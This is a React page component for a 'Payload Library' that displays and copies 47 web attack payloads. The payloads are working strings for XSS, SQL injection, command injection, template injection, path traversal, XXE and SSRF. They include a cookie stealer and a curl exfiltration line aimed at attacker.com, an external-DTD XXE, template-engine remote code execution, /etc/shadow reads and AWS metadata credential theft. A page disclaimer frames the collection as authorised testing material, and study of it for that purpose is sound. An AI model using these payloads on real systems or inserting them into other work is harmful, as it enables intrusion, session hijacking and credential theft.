import { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { FaBomb, FaSearch, FaCopy, FaTimes, FaShieldAlt, FaCode, FaExclamationTriangle } from 'react-icons/fa';
import { toast } from 'react-toastify';
import { copyToClipboard } from '../utils/copyToClipboard';
import GradientHeader from '../components/UI/GradientHeader';

const PAYLOADS = [
  // ── XSS ──────────────────────────────────────
  { id: 1, category: 'XSS', subcategory: 'Reflected', severity: 'High', payload: '<script>alert(1)</script>', description: 'Basic XSS — simplest alert proof of concept.' },
  { id: 2, category: 'XSS', subcategory: 'Reflected', severity: 'High', payload: '"><script>alert(document.domain)</script>', description: 'Breaking out of an attribute context, then alerting the domain.' },
  { id: 3, category: 'XSS', subcategory: 'Event Handler', severity: 'High', payload: '" onmouseover="alert(1)', description: 'Event handler injection via onmouseover attribute.' },
  { id: 4, category: 'XSS', subcategory: 'Event Handler', severity: 'High', payload: "' onfocus='alert(1)' autofocus='", description: 'Auto-trigger XSS via onfocus + autofocus on input.' },
  { id: 5, category: 'XSS', subcategory: 'IMG Tag', severity: 'High', payload: '<img src=x onerror=alert(1)>', description: 'XSS via broken image tag — fires on image load error.' },
  { id: 6, category: 'XSS', subcategory: 'SVG', severity: 'High', payload: '<svg onload=alert(1)>', description: 'SVG-based XSS — works even when script tags are filtered.' },
  { id: 7, category: 'XSS', subcategory: 'Cookie Stealer', severity: 'Critical', payload: '<script>fetch("https://attacker.com/?c="+document.cookie)</script>', description: 'Exfiltrate session cookies to an attacker-controlled server.' },
  { id: 8, category: 'XSS', subcategory: 'Filter Bypass', severity: 'High', payload: '<ScRiPt>alert(1)</sCrIpT>', description: 'Case variation to bypass naive case-sensitive WAF filters.' },
  { id: 9, category: 'XSS', subcategory: 'Filter Bypass', severity: 'High', payload: '<script>alert`1`</script>', description: 'Template literal syntax — bypasses filters looking for parentheses.' },
  { id: 10, category: 'XSS', subcategory: 'Polyglot', severity: 'High', payload: '";alert(1);//', description: 'Breaks out of a JavaScript string context.' },

  // ── SQL Injection ─────────────────────────────
  { id: 11, category: 'SQL Injection', subcategory: 'Basic', severity: 'Critical', payload: "' OR '1'='1", description: 'Classic authentication bypass — makes the WHERE clause always true.' },
  { id: 12, category: 'SQL Injection', subcategory: 'Basic', severity: 'Critical', payload: "' OR '1'='1'--", description: 'Auth bypass with comment to ignore the rest of the query.' },
  { id: 13, category: 'SQL Injection', subcategory: 'Union', severity: 'Critical', payload: "' UNION SELECT NULL,NULL,NULL--", description: 'UNION-based injection — enumerate column count with NULL values.' },
  { id: 14, category: 'SQL Injection', subcategory: 'Union', severity: 'Critical', payload: "' UNION SELECT username,password,NULL FROM users--", description: 'Dump user credentials via UNION SELECT.' },
  { id: 15, category: 'SQL Injection', subcategory: 'Error-Based', severity: 'High', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", description: 'MySQL error-based injection to extract database version.' },
  { id: 16, category: 'SQL Injection', subcategory: 'Time-Based', severity: 'High', payload: "' AND SLEEP(5)--", description: 'Time-based blind SQLi — confirms injection by causing a 5 second delay.' },
  { id: 17, category: 'SQL Injection', subcategory: 'Time-Based', severity: 'High', payload: "' AND IF(1=1,SLEEP(5),0)--", description: 'Conditional time-based blind — true condition triggers sleep.' },
  { id: 18, category: 'SQL Injection', subcategory: 'Boolean', severity: 'High', payload: "' AND 1=1--", description: 'Boolean-based blind — true condition returns normal response.' },
  { id: 19, category: 'SQL Injection', subcategory: 'Boolean', severity: 'High', payload: "' AND 1=2--", description: 'Boolean-based blind — false condition returns different response.' },
  { id: 20, category: 'SQL Injection', subcategory: 'MSSQL', severity: 'Critical', payload: "'; EXEC xp_cmdshell('whoami')--", description: 'MSSQL command execution via xp_cmdshell (requires SA privileges).' },

  // ── Command Injection ─────────────────────────
  { id: 21, category: 'Command Injection', subcategory: 'Basic', severity: 'Critical', payload: '; whoami', description: 'Semicolon separator — executes whoami after the original command.' },
  { id: 22, category: 'Command Injection', subcategory: 'Basic', severity: 'Critical', payload: '| whoami', description: 'Pipe operator — chains commands.' },
  { id: 23, category: 'Command Injection', subcategory: 'Basic', severity: 'Critical', payload: '&& whoami', description: 'AND operator — executes if the first command succeeds.' },
  { id: 24, category: 'Command Injection', subcategory: 'Basic', severity: 'Critical', payload: '`whoami`', description: 'Backtick command substitution — executes inline.' },
  { id: 25, category: 'Command Injection', subcategory: 'Basic', severity: 'Critical', payload: '$(whoami)', description: 'Command substitution using $() — modern shell syntax.' },
  { id: 26, category: 'Command Injection', subcategory: 'Blind', severity: 'Critical', payload: '; curl http://attacker.com/$(whoami)', description: 'Blind RCE via DNS/HTTP exfiltration — confirm execution by checking server logs.' },
  { id: 27, category: 'Command Injection', subcategory: 'Filter Bypass', severity: 'Critical', payload: ';w`h`o`a`m`i', description: 'Bypass filters using backticks inside the command name.' },
  { id: 28, category: 'Command Injection', subcategory: 'Windows', severity: 'Critical', payload: '& whoami /all', description: 'Windows CMD injection — get full user and group information.' },
  { id: 29, category: 'Command Injection', subcategory: 'Windows', severity: 'Critical', payload: '| net user', description: 'Windows: list all local user accounts.' },

  // ── SSTI ──────────────────────────────────────
  { id: 30, category: 'SSTI', subcategory: 'Detection', severity: 'Critical', payload: '{{7*7}}', description: 'SSTI detection — if the output shows 49, the template engine is evaluating input.' },
  { id: 31, category: 'SSTI', subcategory: 'Jinja2', severity: 'Critical', payload: '{{config.items()}}', description: 'Jinja2 — dump all Flask configuration including SECRET_KEY.' },
  { id: 32, category: 'SSTI', subcategory: 'Jinja2 RCE', severity: 'Critical', payload: "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}", description: 'Jinja2 RCE via Python object traversal — execute system commands.' },
  { id: 33, category: 'SSTI', subcategory: 'Twig', severity: 'Critical', payload: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', description: 'Twig (PHP) template injection RCE via registerUndefinedFilterCallback.' },
  { id: 34, category: 'SSTI', subcategory: 'FreeMarker', severity: 'Critical', payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', description: 'FreeMarker (Java) template injection RCE.' },
  { id: 35, category: 'SSTI', subcategory: 'ERB (Ruby)', severity: 'Critical', payload: '<%= `id` %>', description: 'ERB (Ruby on Rails) template injection — backtick shell execution.' },

  // ── Path Traversal ────────────────────────────
  { id: 36, category: 'Path Traversal', subcategory: 'Linux', severity: 'High', payload: '../../etc/passwd', description: 'Read Linux /etc/passwd to enumerate system users.' },
  { id: 37, category: 'Path Traversal', subcategory: 'Linux', severity: 'Critical', payload: '../../../../etc/shadow', description: 'Read /etc/shadow — contains password hashes for all users.' },
  { id: 38, category: 'Path Traversal', subcategory: 'Windows', severity: 'High', payload: '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts', description: 'Windows path traversal using backslashes.' },
  { id: 39, category: 'Path Traversal', subcategory: 'Encoded', severity: 'High', payload: '..%2F..%2F..%2Fetc%2Fpasswd', description: 'URL-encoded path traversal — bypasses filters that look for ../' },
  { id: 40, category: 'Path Traversal', subcategory: 'Double Encoded', severity: 'High', payload: '..%252F..%252Fetc%252Fpasswd', description: 'Double URL-encoded — bypasses WAFs that decode once.' },

  // ── XXE ───────────────────────────────────────
  { id: 41, category: 'XXE', subcategory: 'File Read', severity: 'Critical', payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', description: 'Classic XXE — reads /etc/passwd from the server filesystem.' },
  { id: 42, category: 'XXE', subcategory: 'SSRF via XXE', severity: 'Critical', payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', description: 'XXE → SSRF against AWS EC2 metadata service to steal IAM credentials.' },
  { id: 43, category: 'XXE', subcategory: 'OOB Exfil', severity: 'Critical', payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root/>', description: 'Out-of-band XXE data exfiltration via external DTD.' },

  // ── SSRF ──────────────────────────────────────
  { id: 44, category: 'SSRF', subcategory: 'Internal', severity: 'Critical', payload: 'http://localhost/admin', description: 'Access the localhost admin panel via SSRF.' },
  { id: 45, category: 'SSRF', subcategory: 'AWS Metadata', severity: 'Critical', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', description: 'AWS EC2 IMDS — retrieve IAM instance role credentials.' },
  { id: 46, category: 'SSRF', subcategory: 'Bypass', severity: 'High', payload: 'http://127.1/', description: 'Alternative localhost representation to bypass filters blocking "localhost" and "127.0.0.1".' },
  { id: 47, category: 'SSRF', subcategory: 'Bypass', severity: 'High', payload: 'http://0x7f000001/', description: 'Hexadecimal representation of 127.0.0.1 — bypasses naive filters.' },
];

const categories = ['All', ...new Set(PAYLOADS.map(p => p.category))];
const sevColor = { Critical: '#f87171', High: '#fbbf24', Medium: '#60a5fa', Low: '#34d399' };
const catColor = { 'XSS': '#a78bfa', 'SQL Injection': '#f87171', 'Command Injection': '#fb923c', 'SSTI': '#fbbf24', 'Path Traversal': '#38bdf8', 'XXE': '#c084fc', 'SSRF': '#34d399' };
const catIcon = { 'XSS': '⚡', 'SQL Injection': '🗄️', 'Command Injection': '💻', 'SSTI': '🔧', 'Path Traversal': '📁', 'XXE': '📄', 'SSRF': '🔗' };

const PayloadLibrary = () => {
  const [search, setSearch] = useState('');
  const [activeCategory, setActiveCategory] = useState('All');
  const [activeSev, setActiveSev] = useState('All');

  const filtered = useMemo(() => PAYLOADS.filter(p => {
    const matchSearch = p.payload.toLowerCase().includes(search.toLowerCase()) || p.description.toLowerCase().includes(search.toLowerCase()) || p.subcategory.toLowerCase().includes(search.toLowerCase());
    const matchCat = activeCategory === 'All' || p.category === activeCategory;
    const matchSev = activeSev === 'All' || p.severity === activeSev;
    return matchSearch && matchCat && matchSev;
  }), [search, activeCategory, activeSev]);

  const handleCopy = (payload) => {
    copyToClipboard(payload);
    toast.success('💣 Payload copied!', { position: 'bottom-right', autoClose: 1500, hideProgressBar: true });
  };

  return (
    <div style={{ padding: '0 20px 60px', maxWidth: '1200px', margin: '0 auto' }}>
      <GradientHeader
        title="Payload Library"
        subtitle="Curated attack payloads for XSS, SQLi, Command Injection, SSTI, XXE, Path Traversal & SSRF"
        icon={<FaBomb />}
      />

      {/* Legal disclaimer */}
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}
        style={{ padding: '12px 18px', borderRadius: '12px', background: 'rgba(248,113,113,0.1)', border: '1px solid rgba(248,113,113,0.3)', marginBottom: '24px', display: 'flex', alignItems: 'center', gap: '10px' }}>
        <FaExclamationTriangle style={{ color: '#f87171', flexShrink: 0 }} />
        <p style={{ fontSize: '12px', color: 'var(--text-light)', margin: 0 }}>
          <strong style={{ color: '#f87171' }}>Educational use only.</strong> Use these payloads only on systems you own or have explicit written authorization to test.
        </p>
      </motion.div>

      {/* Category tabs */}
      <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap', marginBottom: '16px' }}>
        {categories.map(cat => {
          const color = catColor[cat] || 'var(--primary)';
          const active = activeCategory === cat;
          return (
            <motion.button key={cat} onClick={() => setActiveCategory(cat)} whileHover={{ scale: 1.04 }} whileTap={{ scale: 0.96 }}
              style={{ padding: '8px 16px', borderRadius: '20px', border: `1.5px solid ${active ? color : 'var(--border)'}`, background: active ? `${color}22` : 'var(--card-bg)', color: active ? color : 'var(--text-light)', fontWeight: '700', fontSize: '13px', cursor: 'pointer' }}>
              {cat !== 'All' ? `${catIcon[cat] || ''} ` : ''}{cat}
            </motion.button>
          );
        })}
      </div>

      {/* Severity + Search row */}
      <div style={{ display: 'flex', gap: '12px', marginBottom: '24px', flexWrap: 'wrap' }}>
        <div style={{ flex: 1, minWidth: '200px', display: 'flex', alignItems: 'center', gap: '10px', background: 'var(--card-bg)', border: '1.5px solid var(--border-strong)', borderRadius: '12px', padding: '10px 16px' }}>
          <FaSearch style={{ color: 'var(--primary)' }} />
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search payloads..."
            style={{ border: 'none', background: 'transparent', color: 'var(--text)', outline: 'none', width: '100%', fontSize: '14px', fontFamily: 'inherit' }} />
          {search && <button onClick={() => setSearch('')} style={{ background: 'transparent', border: 'none', cursor: 'pointer', color: 'var(--text-lighter)' }}><FaTimes /></button>}
        </div>
        {['All', 'Critical', 'High', 'Medium'].map(s => (
          <motion.button key={s} onClick={() => setActiveSev(s)} whileHover={{ scale: 1.04 }}
            style={{ padding: '10px 16px', borderRadius: '12px', border: `1.5px solid ${activeSev === s ? (sevColor[s] || 'var(--primary)') : 'var(--border)'}`, background: activeSev === s ? `${sevColor[s] || 'var(--primary)'}22` : 'var(--card-bg)', color: activeSev === s ? (sevColor[s] || 'var(--primary)') : 'var(--text-light)', fontWeight: '700', fontSize: '13px', cursor: 'pointer' }}>
            {s}
          </motion.button>
        ))}
      </div>

      <p style={{ fontSize: '12px', color: 'var(--text-lighter)', marginBottom: '16px' }}>{filtered.length} payloads</p>

      {/* Payload grid */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
        {filtered.map((p, i) => {
          const cc = catColor[p.category] || '#a78bfa';
          const sc = sevColor[p.severity] || '#fbbf24';
          return (
            <motion.div key={p.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: Math.min(i * 0.03, 0.5) }}
              style={{ padding: '16px 20px', borderRadius: '14px', background: 'var(--card-bg)', border: `1px solid var(--border)`, transition: 'border-color 0.2s' }}
              onMouseEnter={e => e.currentTarget.style.borderColor = cc + '55'}
              onMouseLeave={e => e.currentTarget.style.borderColor = 'var(--border)'}>
              <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px', flexWrap: 'wrap' }}>
                    <span style={{ background: `${cc}22`, color: cc, fontSize: '10px', padding: '2px 8px', borderRadius: '10px', fontWeight: '700' }}>{p.category}</span>
                    <span style={{ background: `${sc}22`, color: sc, fontSize: '10px', padding: '2px 8px', borderRadius: '10px', fontWeight: '700' }}>
                      <FaShieldAlt style={{ marginRight: '3px', fontSize: '9px' }} />{p.severity}
                    </span>
                    <span style={{ fontSize: '11px', color: 'var(--text-lighter)' }}>{p.subcategory}</span>
                  </div>
                  <code style={{ display: 'block', fontFamily: "'JetBrains Mono', monospace", fontSize: '13px', color: cc, background: `${cc}10`, padding: '10px 14px', borderRadius: '8px', wordBreak: 'break-all', marginBottom: '8px', border: `1px solid ${cc}22` }}>
                    {p.payload}
                  </code>
                  <p style={{ fontSize: '13px', color: 'var(--text-light)', margin: 0, lineHeight: '1.5' }}>{p.description}</p>
                </div>
                <motion.button onClick={() => handleCopy(p.payload)} whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}
                  style={{ flexShrink: 0, padding: '10px 16px', borderRadius: '10px', border: `1px solid ${cc}44`, background: `${cc}15`, color: cc, cursor: 'pointer', fontWeight: '700', fontSize: '13px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <FaCopy /> Copy
                </motion.button>
              </div>
            </motion.div>
          );
        })}
      </div>
    </div>
  );
};

export default PayloadLibrary;
